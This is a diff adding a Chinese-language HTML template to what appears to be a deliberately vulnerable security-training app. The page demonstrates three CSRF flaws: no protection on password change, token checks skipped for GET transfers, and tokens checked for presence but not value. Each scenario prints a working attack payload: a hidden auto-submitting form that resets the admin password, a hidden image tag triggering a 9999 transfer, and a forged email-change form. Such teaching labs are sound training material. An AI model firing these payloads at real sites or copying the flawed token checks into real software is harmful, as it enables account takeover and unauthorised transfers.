@@ -1,0 +1,70 @@
+{% extends "base.html" %}
+{% block content %}
+
+<div class="card">
+    <h2 class="card-title">🎯 CSRF 跨站请求伪造漏洞演示</h2>
+    <p class="card-text">以下演示 3 种常见的 CSRF 漏洞场景。</p>
+</div>
+
+<div class="card" style="border-left: 4px solid #e74c3c;">
+    <h3>🔴 场景 CSRF-01：完全无防御</h3>
+    <p class="card-text">修改密码接口无任何 CSRF 保护，攻击者可构造恶意页面让受害者自动提交。</p>
+    <div class="pass-info">
+        <div class="pass-info-atk"><strong>攻击方式：</strong>构造隐藏表单自动提交到 /change-password</div>
+    </div>
+    <pre style="background:#fde8e8;padding:12px;border-radius:6px;font-size:13px;">
+&lt;form action="http://target/change-password" method="POST" style="display:none"&gt;
+  &lt;input name="username" value="admin"&gt;
+  &lt;input name="new_password" value="hacked"&gt;
+  &lt;input name="confirm_password" value="hacked"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>
+</div>
+
+<div class="card" style="border-left: 4px solid #e67e22;">
+    <h3>🟠 场景 CSRF-02：令牌验证依赖于请求方法</h3>
+    <p class="card-text">POST 转账需要 CSRF Token，但 <strong>GET 请求不检查</strong> Token，攻击者可用 GET 方式绕过。</p>
+
+    <h4>✅ 正常 POST 转账（需 Token）</h4>
+    <form method="post" action="/csrf-transfer-post" class="form">
+        <div class="form-group"><label>接收人</label><input name="to_user" value="alice" class="form-input"></div>
+        <div class="form-group"><label>金额</label><input name="amount" value="100" class="form-input"></div>
+        <input type="hidden" name="csrf_token" value="fixed-token">
+        <button type="submit" class="btn btn-primary">POST 转账</button>
+    </form>
+
+    <h4>🚫 攻击：GET 转账（绕过 CSRF Token）</h4>
+    <div class="pass-info">
+        <div class="pass-info-atk"><strong>攻击方式：</strong>使用 GET 请求完全绕过 CSRF Token 检查</div>
+    </div>
+    <pre style="background:#fde8e8;padding:12px;border-radius:6px;font-size:13px;">
+&lt;img src="http://target/csrf-transfer-get?to_user=alice&amount=9999" style="display:none"&gt;</pre>
+    <a href="/csrf-transfer-get?to_user=alice&amount=9999" class="btn btn-danger" style="background:#e74c3c;color:#fff;padding:8px 16px;border-radius:4px;text-decoration:none;">
+        🔗 测试：点击此链接执行 GET 转账 9999
+    </a>
+</div>
+
+<div class="card" style="border-left: 4px solid #f39c12;">
+    <h3>🟡 场景 CSRF-03：令牌验证依赖于令牌的存在</h3>
+    <p class="card-text">服务器只检查表单中是否包含 <code>csrf_token</code> 字段，但 <strong>不验证字段的值</strong>。</p>
+
+    <div class="pass-info">
+        <div class="pass-info-atk"><strong>攻击方式：</strong>提交任意值的 csrf_token=xxx 即可通过验证</div>
+    </div>
+
+    <form method="post" action="/csrf-update-profile" class="form">
+        <div class="form-group"><label>邮箱</label><input name="email" value="attacker@evil.com" class="form-input"></div>
+        <div class="form-group"><label>CSRF Token（任意值即可通过）</label><input name="csrf_token" value="任意值" class="form-input"></div>
+        <button type="submit" class="btn btn-primary">更新资料（任意 Token 值）</button>
+    </form>
+    <pre style="background:#fde8e8;padding:12px;border-radius:6px;font-size:13px;">
+&lt;form action="http://target/csrf-update-profile" method="POST"&gt;
+  &lt;input name="email" value="hacker@evil.com"&gt;
+  &lt;input name="csrf_token" value="fake123"&gt;  &lt;!-- 任意值 --&gt;
+&lt;/form&gt;</pre>
+</div>
+
+<div class="card">
+    <a href="{{ url_for('index') }}" class="btn btn-secondary">返回首页</a>
+</div>
+{% endblock %}
